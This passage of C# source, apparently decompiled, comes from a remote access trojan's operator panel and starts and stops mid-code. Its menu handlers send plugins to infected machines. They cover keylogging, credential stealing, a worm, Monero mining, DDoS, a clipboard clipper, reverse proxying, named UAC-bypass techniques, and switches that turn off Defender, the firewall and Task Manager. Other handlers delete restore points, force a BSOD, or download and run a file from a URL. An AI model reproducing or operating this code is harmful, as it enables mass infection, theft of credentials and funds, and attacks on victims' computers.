					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void shellToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Shell.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormShell)Application.OpenForms["Shell:" + clients.Hwid] == null)
			{
				FormShell formShell = new FormShell();
				formShell.Name = "Shell:" + clients.Hwid;
				formShell.parrent = clients;
				formShell.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void netStatToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Netstat.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormNetstat)Application.OpenForms["Netstat:" + clients.Hwid] == null)
			{
				FormNetstat formNetstat = new FormNetstat();
				formNetstat.Name = "Netstat:" + clients.Hwid;
				formNetstat.parrent = clients;
				formNetstat.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void keyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\KeyLogger.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormKeyLogger)Application.OpenForms["KeyLogger:" + clients.Hwid] == null)
			{
				FormKeyLogger formKeyLogger = new FormKeyLogger();
				formKeyLogger.Name = "KeyLogger:" + clients.Hwid;
				formKeyLogger.parrent = clients;
				formKeyLogger.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void autorunToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\AutoRun.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormAutoRun)Application.OpenForms["AutoRun:" + clients.Hwid] == null)
			{
				FormAutoRun formAutoRun = new FormAutoRun();
				formAutoRun.Name = "AutoRun:" + clients.Hwid;
				formAutoRun.parrent = clients;
				formAutoRun.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void fromDiskToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string checksum = Methods.GetChecksum(openFileDialog.FileName);
		byte[] pack = LEB128.Write(new object[3] { "SendDiskGet", openFileDialog.FileName, checksum });
		string checksum2 = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum2, pack });
			});
		}
	}

	private void fromMemoryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		string checksum = Methods.GetChecksum(openFileDialog.FileName);
		byte[] pack = LEB128.Write(new object[3] { "SendMemoryGet", openFileDialog.FileName, checksum });
		string checksum2 = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum2, pack });
			});
		}
	}

	private void fromLinkToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "Url";
		formInput.rjTextBox1.PlaceholderText = "https://example.com/ups.exe";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[2]
		{
			"SendLink",
			formInput.rjTextBox1.Texts
		});
		string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void serviceToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Service.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormService)Application.OpenForms["Service:" + clients.Hwid] == null)
			{
				FormService formService = new FormService();
				formService.Name = "Service:" + clients.Hwid;
				formService.parrent = clients;
				formService.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void funToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Fun.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormFun)Application.OpenForms["Fun:" + clients.Hwid] == null)
			{
				FormFun formFun = new FormFun();
				formFun.Name = "Fun:" + clients.Hwid;
				formFun.parrent = clients;
				formFun.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void chatToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Chat.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormChat)Application.OpenForms["Chat:" + clients.Hwid] == null)
			{
				FormChat formChat = new FormChat();
				formChat.Name = "Chat:" + clients.Hwid;
				formChat.parrent = clients;
				formChat.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void changeWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[3]
		{
			"Wallpaper",
			File.ReadAllBytes(openFileDialog.FileName),
			Path.GetExtension(openFileDialog.FileName)
		});
		string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
		byte[] pack = LEB128.Write(new object[2] { "Pack", "ReverseProxy" });
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormReverseProxy)Application.OpenForms["ReverseProxy:" + clients.Hwid] == null)
			{
				FormReverseProxy formReverseProxy = new FormReverseProxy();
				formReverseProxy.Name = "ReverseProxy:" + clients.Hwid;
				formReverseProxy.parrent = clients;
				formReverseProxy.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3] { "Invoke", checksum, pack });
				});
			}
		}
	}

	private void wormsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Worm.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void stealerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Stealer.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void disableUACToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[1] { "DisableUAC" });
		string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void disableWDToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[1] { "DisableDefedner" });
		string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[1] { "Shutdown" });
		string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void restartToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[1] { "Restart" });
		string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void logOutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[1] { "Logoff" });
		string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void botKillerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\BotKiller.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void minerXMRToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (!MinerXMR.Visible && MinerXMR.work)
		{
			MinerXMR.Show();
		}
		if (MinerXMR.work)
		{
			return;
		}
		MinerXMR.Show();
		MinerXMR.work = true;
		string checksum = Methods.GetChecksum("Plugin\\MinerXMR.dll");
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void dDOSPanelToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (!DDos.Visible && DDos.work)
		{
			DDos.Show();
		}
		if (DDos.work)
		{
			return;
		}
		DDos.Show();
		DDos.work = true;
		string checksum = Methods.GetChecksum("Plugin\\DDos.dll");
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void clipperPanelToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!Clipper.Visible && Clipper.work)
		{
			Clipper.Show();
		}
		if (Clipper.work)
		{
			return;
		}
		Clipper.Show();
		Clipper.work = true;
		string checksum = Methods.GetChecksum("Plugin\\Clipper.dll");
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void runAsAdminUacToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "runas" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void runAsSystemToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "runassystem" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void eventvwrToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "Eventvwr" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void fodhelperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "Fodhelper" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void computerdefaultsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "Computerdefaults" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void sDCLTToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "SDCLT" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void sLUIToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "SLUI" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void diskCleanupToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
		byte[] pack = LEB128.Write(new object[1] { "DiskCleanup" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void clearToolStripMenuItem_Click(object sender, EventArgs e)
	{
		GridLogs.Rows.Clear();
	}

	private void proxyRPanelToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (!ReverseProxyR.Visible && ReverseProxyR.work)
		{
			ReverseProxyR.Show();
		}
		if (ReverseProxyR.work)
		{
			return;
		}
		ReverseProxyR.Show();
		ReverseProxyR.work = true;
		string checksum = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
		byte[] pack = LEB128.Write(new object[2] { "Pack", "ReverseProxyR" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void windowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Window.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormWindow)Application.OpenForms["Window:" + clients.Hwid] == null)
			{
				FormWindow formWindow = new FormWindow();
				formWindow.Name = "Window:" + clients.Hwid;
				formWindow.parrent = clients;
				formWindow.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void keyLoggerSetupToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0 || !File.Exists("Stub\\KeyLogger.exe"))
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[3]
		{
			"SendDisk",
			".exe",
			File.ReadAllBytes("Stub\\KeyLogger.exe")
		});
		string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void keyLoggerDownloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\KeyLoggerPanel.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormKeyLoggerPanel)Application.OpenForms["KeyLoggerPanel:" + clients.Hwid] == null)
			{
				FormKeyLoggerPanel formKeyLoggerPanel = new FormKeyLoggerPanel();
				formKeyLoggerPanel.Name = "KeyLoggerPanel:" + clients.Hwid;
				formKeyLoggerPanel.parrent = clients;
				formKeyLoggerPanel.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void programsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Programs.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormPrograms)Application.OpenForms["Programs:" + clients.Hwid] == null)
			{
				FormPrograms formPrograms = new FormPrograms();
				formPrograms.Name = "Programs:" + clients.Hwid;
				formPrograms.parrent = clients;
				formPrograms.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void installNfx3ToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Net3" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem16_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Regedit+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem17_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Regedit-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem10_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "TaskMgr+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem14_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "TaskMgr-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Uac+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Uac-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem19_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Firewall+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem20_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Firewall-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void enableToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Cmd+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void disableToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Cmd-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void deletePointsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "DeletePoints" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void bSODToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "BSOD" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem25_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Update+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem26_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Update-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem22_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "WinR+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem23_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "WinR+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem28_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Defender+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem29_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "Defender-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem30_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Clipboard.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormClipboard)Application.OpenForms["Clipboard:" + clients.Hwid] == null)
			{
				FormClipboard formClipboard = new FormClipboard();
				formClipboard.Name = "Clipboard:" + clients.Hwid;
				formClipboard.parrent = clients;
				formClipboard.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void vIsbleToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "Url";
		formInput.rjTextBox1.PlaceholderText = "https://example.com/";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[2]
		{
			"OpenLink",
			formInput.rjTextBox1.Texts
		});
		string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void invisibleToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "Url";
